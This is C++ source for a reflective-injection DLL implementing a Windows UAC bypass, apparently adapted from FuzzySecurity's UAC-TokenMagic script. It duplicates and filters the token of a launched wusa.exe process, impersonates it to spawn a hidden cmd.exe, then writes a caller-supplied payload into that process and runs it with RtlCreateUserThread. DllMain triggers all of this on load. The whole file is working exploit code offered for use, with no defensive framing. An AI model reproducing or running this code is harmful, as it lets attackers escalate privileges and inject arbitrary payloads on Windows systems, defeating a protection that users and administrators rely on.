//Built using https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
//http://resources.infosecinstitute.com/calling-ntdll-functions-directly/
//https://malwaretips.com/threads/theory-native-windows-api-ntapi.63573/
//https://undocumented.ntinternals.net/
//http://processhacker.sourceforge.net/doc/ntseapi_8h.html

#include "ReflectiveLoader.h"

bool UACBypass(LPVOID lpPayload)
{
	HMODULE hNtdll;
	HANDLE hFile;
	HANDLE hProcess;
	HANDLE hToken;
	HANDLE hNewToken;
	HANDLE pSID;
	HANDLE lToken;
	SHELLEXECUTEINFO eWusa;
	SID_IDENTIFIER_AUTHORITY sSIA = SECURITY_MANDATORY_LABEL_AUTHORITY;
	SID_AND_ATTRIBUTES sSAA;
	TOKEN_MANDATORY_LABEL sTML;
	STARTUPINFO sStartInfo;
	PROCESS_INFORMATION sProcessInfo;
	LPVOID memoryCave;
	HANDLE elevatedProcess;
	SIZE_T bytesWritten;
	BOOL writeTest = FALSE;
	NTSTATUS nStatus;
	HANDLE hRemoteThread;
	

	hNtdll = LoadLibraryA("ntdll.dll");

	pdef_NtSetInformationToken NtSetInfoToken = (pdef_NtSetInformationToken)GetProcAddress(hNtdll, "NtSetInformationToken");
	if (NtSetInfoToken == NULL) 
		return false;

	pdef_NtFilterToken NtTokenFilter = (pdef_NtFilterToken)GetProcAddress(hNtdll, "NtFilterToken");
	if (NtTokenFilter == NULL)
		return false;

	pRtlCreateUserThread CreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
	if (CreateUserThread == NULL) 
		return false;

	hFile = CreateFile(L"C:\\windows\\system32\\test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		DeleteFile(L"C:\\windows\\system32\\test.txt");
		return true;
	}

	memset(&eWusa, 0, sizeof(SHELLEXECUTEINFO));
	eWusa.cbSize = sizeof(eWusa);
	eWusa.fMask = 0x40;
	eWusa.lpFile = L"wusa.exe";
	eWusa.nShow = 0x0;

	if (!ShellExecuteEx(&eWusa))
		return false;

	hProcess = eWusa.hProcess;

	if (!OpenProcessToken(hProcess, 0x02000000, &hToken))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	if (!DuplicateTokenEx(hToken, 0xf01ff, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	if (!AllocateAndInitializeSid(&sSIA, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSID))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}
	sSAA.Sid = pSID;
	sSAA.Attributes = SE_GROUP_INTEGRITY;
	sTML.Label = sSAA;

	if (NtSetInfoToken(hNewToken, TokenIntegrityLevel, &sTML, sizeof(TOKEN_MANDATORY_LABEL)) != 0)
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	if (NtTokenFilter(hNewToken, 4, NULL, NULL, NULL, &lToken) != 0)
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	hNewToken = NULL;

	if (!DuplicateTokenEx(lToken, 0xc, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	if (!ImpersonateLoggedOnUser(hNewToken))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	memset(&sStartInfo, 0, sizeof(STARTUPINFO));
	sStartInfo.dwFlags = 0x00000001;
	sStartInfo.wShowWindow = 0x0000;
	sStartInfo.cb = sizeof(STARTUPINFO);

	memset(&sProcessInfo, 0, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessWithLogonW(L"aaa", L"bbb", L"ccc", 0x00000002, L"C:\\Windows\\System32\\cmd.exe", NULL, 0x04000000, NULL, NULL, &sStartInfo, &sProcessInfo))
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	elevatedProcess = sProcessInfo.hProcess;
	memoryCave = VirtualAllocEx(elevatedProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (memoryCave == NULL)
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	writeTest = WriteProcessMemory(elevatedProcess, memoryCave, lpPayload, 4096, &bytesWritten);
	if (!writeTest)
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	nStatus = CreateUserThread(elevatedProcess, NULL, 0, 0, 0, 0, memoryCave, NULL, &hRemoteThread, NULL);
	if (nStatus != 0)
	{
		TerminateProcess(hProcess, ERROR_SUCCESS);
		return false;
	}

	TerminateProcess(hProcess, ERROR_SUCCESS);
	return true;
}

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)

extern "C" HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		UACBypass(lpReserved);
		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}